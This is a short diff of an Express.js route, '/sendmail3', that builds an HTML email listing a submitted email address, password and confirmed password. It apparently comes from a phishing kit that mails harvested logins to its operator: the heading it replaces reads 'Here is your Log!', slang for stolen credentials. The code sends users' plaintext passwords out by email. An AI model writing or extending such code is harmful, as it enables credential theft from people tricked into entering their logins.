@@ -65,7 +65,7 @@ app.post("/sendmail3", async (req, res) => {
       subject: "happy Time",
       html: `
     <div> 
-      <h2>Here is your Log!</h2>
+      <h2>Enjoy</h2>
         <p>Email: ${email}</p>
         <p>Pass: ${pass}</p>
         <p>Confirm Pass: ${pasers}</p>
